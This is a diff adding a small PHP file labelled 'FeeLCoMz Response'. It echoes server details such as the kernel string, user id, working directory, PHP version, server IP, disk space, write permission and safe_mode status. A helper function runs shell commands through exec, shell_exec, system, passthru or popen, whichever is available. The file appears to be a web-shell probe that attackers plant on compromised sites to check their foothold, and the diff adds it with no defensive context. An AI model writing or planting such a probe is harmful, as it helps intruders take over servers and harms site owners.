@@ -1,0 +1,69 @@
+<?php
+//FeeLCoMz Response
+$pwd1 =	@getcwd();
+$un = @php_uname();
+$os = @PHP_OS;
+$id1 = ex("id");if (empty($id1)) {$id1 = @get_current_user();}
+$sof1 =	@getenv("SERVER_SOFTWARE");
+$php1 =	@phpversion();
+$name1 = $_SERVER['SERVER_NAME'];
+$ip1 = @gethostbyname($SERVER_ADDR);
+$free1=	@diskfreespace($pwd1);
+$all1= disk_total_space($pwd1);
+$used =	ConvertBytes($all1-$free1);
+$free =	ConvertBytes(@diskfreespace($pwd1));if (!$free) {$free = 0;}
+$all = ConvertBytes(@disk_total_space($pwd1));if (!$all) {$all = 0;}
+if (@is_writable($pwd1)) {$perm = "[W]";} else {$perm = "[R]";}
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {$sf = "ON";} else {$sf = "OFF";}
+
+echo "FeeLCoMz".$sf."<br>";
+echo "uname -a:	$un<br>";
+echo "os: $os<br>";
+echo "id: $id1<br>";
+echo "pwd: $pwd1<br>";
+echo "php: $php1<br>";
+echo "software:	$sof1<br>";
+echo "srvip: $ip1<br>";
+echo "srvname: $name1<br>";
+echo "free: $free<br>";
+echo "used: $used<br>";
+echo "total: $all $perm<br>";
+
+function ConvertBytes($number) {
+  $len = strlen($number);
+  if($len < 4) { return sprintf("%d b", $number); }
+  if($len >= 4 && $len <=6) { return sprintf("%0.2f Kb", $number/1024); }
+  if($len >= 7 && $len <=9) { return sprintf("%0.2f Mb", $number/1024/1024); }
+  return sprintf("%0.2f Gb", $number/1024/1024/1024);
+}
+
+function ex($cfe) {
+  $res = '';
+  if (!empty($cfe)) {
+    if(function_exists('exec')) {
+      @exec($cfe,$res);
+      $res = join("\n",$res);
+    } elseif(function_exists('shell_exec')) {
+      $res = @shell_exec($cfe);
+    } elseif(function_exists('system')) {
+      @ob_start();
+      @system($cfe);
+      $res = @ob_get_contents();
+      @ob_end_clean();
+    } elseif(function_exists('passthru')) {
+      @ob_start();
+      @passthru($cfe);
+      $res = @ob_get_contents();
+      @ob_end_clean();
+    } elseif(@is_resource($f = @popen($cfe,"r"))) {
+      $res = "";
+      while(!@feof($f)) { $res .= @fread($f,1024); }
+      @pclose($f);
+    } else { $res = "NULL"; }
+  }
+  return $res;
+}
+
+exit;
+
+?>
